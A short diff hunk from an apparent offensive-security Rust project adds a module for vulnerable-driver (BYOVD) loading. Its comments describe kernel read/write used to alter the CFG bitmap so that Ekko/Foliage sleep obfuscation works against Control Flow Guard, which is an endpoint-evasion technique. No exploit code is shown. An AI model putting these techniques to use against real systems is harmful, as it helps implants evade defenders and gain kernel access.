@@ -60,6 +60,7 @@ use core::fmt;
 /// ntoskrnl symbol resolution are real and unit-tested; the driver LOAD step
 /// is operator-side and never runs on this host.
 pub mod byovd;
+pub mod byovd_drivers;
 /// CFG bitmap manipulation — mark NtContinue as valid call target via kernel r/w.
 /// Used to enable Ekko/Foliage sleep obfuscation on CFG-enabled processes
 /// where CreateTimerQueueTimer callbacks are blocked by Control Flow Guard.
